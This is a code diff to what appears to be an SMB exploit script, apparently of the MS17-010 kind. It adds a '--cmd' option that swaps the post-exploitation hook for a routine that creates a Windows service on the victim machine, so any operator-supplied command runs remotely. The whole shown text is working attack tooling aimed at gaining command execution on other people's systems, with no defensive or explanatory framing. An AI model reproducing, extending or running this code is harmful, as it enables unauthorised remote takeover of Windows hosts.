@@ -1023,7 +1023,7 @@ def service_exec(conn, cmd):
 			scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])
 
 		print('Creating service %s.....' % service_name)
-		resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')
+		resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=CMD + '\x00')
 		serviceHandle = resp['lpServiceHandle']
 
 		if serviceHandle:
@@ -1054,10 +1054,15 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
     parser.add_argument("--namedpipe", default="wkssvc")
+    parser.add_argument("-c", "--cmd", help="command to execute through psexec")
     options = parser.parse_args()
 
     import re
     DOMAIN, USERNAME, PASSWORD, target = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')
+
+    if options.cmd is not None:
+        smb_pwn = service_exec
+        CMD = options.cmd
 
     exploit(target, options.namedpipe)
     print('Done')
